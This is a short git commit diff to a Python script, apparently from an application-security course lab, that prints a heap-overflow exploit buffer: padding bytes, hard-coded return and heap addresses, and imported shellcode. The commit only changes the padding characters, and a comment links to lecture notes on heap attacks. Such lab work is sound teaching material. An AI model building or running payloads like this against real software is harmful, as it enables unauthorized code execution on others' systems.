e8d26a51d8bd083cd6be47ec01ad53828866625d
ubuntu <ubuntu@ubuntu.(none)>
2018-09-26 20:24:47 -0400

    checkpoint2

--- AppSec/1.2.8.py
+++ AppSec/1.2.8.py
@@ -1,6 +1,6 @@
 from shellcode import shellcode
 from struct import pack
-print 'A'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'A'*17+pack('<I',0xbffea7dc)+pack('<I',0x080f3748)+" A"
+print '\x01'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'\x01'*17+pack('<I',0xbffea7dc)+pack('<I',0x080f3748)+" "+'\x01'
 
 #recitation
 #http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
